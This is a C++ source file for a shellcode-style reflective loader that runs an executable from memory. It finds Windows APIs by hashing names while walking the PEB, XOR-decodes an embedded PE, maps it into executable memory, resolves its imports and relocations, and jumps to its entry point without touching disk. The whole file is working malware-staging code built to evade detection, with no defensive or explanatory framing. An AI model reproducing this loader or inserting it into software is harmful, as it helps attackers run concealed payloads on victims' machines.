// ShellcodeLoader.cpp
// Position-independent in-memory EXE loader.
// Reflects a raw PE into a fresh allocation without touching disk.
//
// Blob layout (caller prepares):
//   +0x00  uint32  shellcode_size    total size of the .text section bytes
//   +0x04  uint32  entry_offset      offset of ShellcodeEntry within shellcode bytes
//   +0x08  byte[]  shellcode         raw .text bytes  (shellcode_size bytes)
//   +0x08+SC  uint32  pe_size        size of the original PE
//   +0x0C+SC  byte[32] xor_key       per-build random XOR key
//   +0x2C+SC  byte[]  encoded_pe     XOR-encoded PE bytes  (pe_size bytes)
//
// Caller convention:
//   entry = (BYTE*)blob + 8 + entry_offset
//   ((DWORD(WINAPI*)(LPVOID))entry)(blob)   // blobBase = start of blob header

#include <windows.h>
#include <winternl.h>
#pragma intrinsic(_rotr)

// ── no CRT ───────────────────────────────────────────────────────────────────
static void _mc(void* d, const void* s, SIZE_T n)
{
    auto dp = (unsigned char*)d; auto sp = (const unsigned char*)s;
    while (n--) *dp++ = *sp++;
}

// ── PEB-based resolution ──────────────────────────────────────────────────────
#define H_KERNEL32       0x6a4abc5b
#define H_NTDLL          0x3cfa685d
#define H_LoadLibraryA   0xec0e4e8e
#define H_GetProcAddress 0x7c0dfcaa
#define H_VirtualAlloc   0x91afca54
#define H_VirtualProtect 0x7946c61b
#define H_NtFlushIC      0x534c0ab8

typedef HMODULE  (WINAPI* FN_LoadLibraryA  )(LPCSTR);
typedef FARPROC  (WINAPI* FN_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID   (WINAPI* FN_VirtualAlloc  )(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI* FN_VirtualProtect)(LPVOID, SIZE_T, DWORD, LPDWORD);
typedef NTSTATUS (NTAPI*  FN_NtFlushIC     )(HANDLE, PVOID, ULONG);

typedef struct { USHORT Offset:12; USHORT Type:4; } RELOC_ENTRY;

static DWORD _HS(const char* s)
{
    DWORD h = 0;
    while (*s) { char c = *s++; if (c >= 'a') c -= 0x20; h = _rotr(h, 13) + c; }
    return h;
}
static DWORD _HW(const WCHAR* s, USHORT lenBytes)
{
    DWORD h = 0;
    for (int i = 0; i < lenBytes / 2; i++) { char c = (char)s[i]; if (c >= 'a') c -= 0x20; h = _rotr(h, 13) + c; }
    return h;
}

static LPVOID _PebMod(DWORD mhash)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &((PPEB_LDR_DATA)peb->Ldr)->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        LPBYTE b = (LPBYTE)e - 0x10;
        PUNICODE_STRING name = (PUNICODE_STRING)(b + 0x58);
        PVOID base = *(PVOID*)(b + 0x30);
        if (name->Buffer && _HW(name->Buffer, name->Length) == mhash) return base;
    }
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
    PLIST_ENTRY head = &((PPEB_LDR_DATA)peb->Ldr)->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        LPBYTE b = (LPBYTE)e - 0x08;
        PUNICODE_STRING name = (PUNICODE_STRING)(b + 0x2C);
        PVOID base = *(PVOID*)(b + 0x18);
        if (name->Buffer && _HW(name->Buffer, name->Length) == mhash) return base;
    }
#endif
    return nullptr;
}

static LPVOID _PebProc(DWORD mhash, DWORD fhash)
{
    LPBYTE base = (LPBYTE)_PebMod(mhash);
    if (!base) return nullptr;
    auto nt  = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    auto exp = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto names = (LPDWORD)(base + exp->AddressOfNames);
    auto ords  = (LPWORD )(base + exp->AddressOfNameOrdinals);
    auto funcs = (LPDWORD)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (_HS((const char*)(base + names[i])) == fhash)
            return base + funcs[ords[i]];
    return nullptr;
}

static DWORD _SecProt(DWORD ch)
{
    BOOL x = ch & IMAGE_SCN_MEM_EXECUTE, r = ch & IMAGE_SCN_MEM_READ, w = ch & IMAGE_SCN_MEM_WRITE;
    if (x && w) return PAGE_EXECUTE_READWRITE;
    if (x && r) return PAGE_EXECUTE_READ;
    if (x)      return PAGE_EXECUTE;
    if (w)      return PAGE_READWRITE;
    if (r)      return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// ── Entry point ───────────────────────────────────────────────────────────────
// blobBase = pointer to the first byte of the blob (the uint32 shellcode_size field).
extern "C" __declspec(dllexport)
DWORD WINAPI ShellcodeEntry(LPVOID blobBase)
{
    auto valloc  = (FN_VirtualAlloc  )_PebProc(H_KERNEL32, H_VirtualAlloc);
    auto vprot   = (FN_VirtualProtect)_PebProc(H_KERNEL32, H_VirtualProtect);
    auto loadLib = (FN_LoadLibraryA  )_PebProc(H_KERNEL32, H_LoadLibraryA);
    auto getProc = (FN_GetProcAddress)_PebProc(H_KERNEL32, H_GetProcAddress);
    auto ntFlush = (FN_NtFlushIC     )_PebProc(H_NTDLL,    H_NtFlushIC);
    if (!valloc || !vprot || !loadLib || !getProc) return 1;

    // Locate PE section: [uint32 sc_size][uint32 entry_off][sc_bytes...][pe section]
    LPBYTE p      = (LPBYTE)blobBase;
    DWORD scSize  = *(DWORD*)p;           // shellcode .text size
    LPBYTE peSect = p + 8 + scSize;       // skip 8-byte header + shellcode bytes

    DWORD  peSize = *(DWORD*)peSect; peSect += 4;   // original PE size
    LPBYTE key    = peSect;          peSect += 32;  // 32-byte XOR key
    LPBYTE enc    = peSect;                          // XOR-encoded PE bytes

    // Allocate and XOR-decode PE
    LPBYTE peDec = (LPBYTE)valloc(NULL, peSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!peDec) return 2;
    for (DWORD i = 0; i < peSize; i++) peDec[i] = enc[i] ^ key[i & 31];

    // Map PE
    auto ntHdr = (PIMAGE_NT_HEADERS)(peDec + ((PIMAGE_DOS_HEADER)peDec)->e_lfanew);
    auto mapped = (LPBYTE)valloc(NULL, ntHdr->OptionalHeader.SizeOfImage,
                                 MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mapped) return 3;

    // Copy headers + sections
    _mc(mapped, peDec, ntHdr->OptionalHeader.SizeOfHeaders);
    auto secs = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++)
        _mc(mapped + secs[i].VirtualAddress,
            peDec  + secs[i].PointerToRawData,
            secs[i].SizeOfRawData);

    // Resolve imports
    auto& impDir = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir.Size) {
        for (auto imp = (PIMAGE_IMPORT_DESCRIPTOR)(mapped + impDir.VirtualAddress); imp->Name; imp++) {
            auto mod = (LPBYTE)loadLib((LPCSTR)(mapped + imp->Name));
            if (!mod) continue;
            auto thunkOrig = (PIMAGE_THUNK_DATA)(mapped + imp->OriginalFirstThunk);
            auto iat       = (PUINT_PTR)         (mapped + imp->FirstThunk);
            while (*iat) {
                if (IMAGE_SNAP_BY_ORDINAL(*iat)) {
                    auto mnt = (PIMAGE_NT_HEADERS)(mod + ((PIMAGE_DOS_HEADER)mod)->e_lfanew);
                    auto exp = (PIMAGE_EXPORT_DIRECTORY)(mod + mnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    DWORD ord = (DWORD)(IMAGE_ORDINAL(*iat) - exp->Base);
                    *iat = (UINT_PTR)(mod + ((LPDWORD)(mod + exp->AddressOfFunctions))[ord]);
                } else {
                    *iat = (UINT_PTR)getProc((HMODULE)mod, ((PIMAGE_IMPORT_BY_NAME)(mapped + *iat))->Name);
                }
                thunkOrig++; iat++;
            }
        }
    }

    // Apply base relocations
    auto& relDir = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relDir.Size) {
        UINT_PTR delta = (UINT_PTR)(mapped - (LPBYTE)ntHdr->OptionalHeader.ImageBase);
        for (auto blk = (PIMAGE_BASE_RELOCATION)(mapped + relDir.VirtualAddress);
             blk->SizeOfBlock;
             blk = (PIMAGE_BASE_RELOCATION)((LPBYTE)blk + blk->SizeOfBlock))
        {
            auto entry = (RELOC_ENTRY*)((LPBYTE)blk + sizeof(IMAGE_BASE_RELOCATION));
            DWORD count = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(RELOC_ENTRY);
            LPBYTE page = mapped + blk->VirtualAddress;
            for (DWORD i = 0; i < count; i++) {
                if (entry[i].Type == IMAGE_REL_BASED_DIR64)
                    *(PUINT_PTR)(page + entry[i].Offset) += delta;
                else if (entry[i].Type == IMAGE_REL_BASED_HIGHLOW)
                    *(LPDWORD)(page + entry[i].Offset) += (DWORD)delta;
            }
        }
    }

    // Set per-section memory protections
    DWORD oldProt;
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        DWORD size = (i < ntHdr->FileHeader.NumberOfSections - 1)
            ? secs[i + 1].VirtualAddress - secs[i].VirtualAddress
            : ntHdr->OptionalHeader.SizeOfImage - secs[i].VirtualAddress;
        vprot(mapped + secs[i].VirtualAddress, size, _SecProt(secs[i].Characteristics), &oldProt);
    }

    if (ntFlush) ntFlush(INVALID_HANDLE_VALUE, NULL, 0);

    // Transfer execution to stub entry point
    typedef DWORD (WINAPI *EP)(LPVOID);
    ((EP)(mapped + ntHdr->OptionalHeader.AddressOfEntryPoint))(NULL);
    return 0;
}
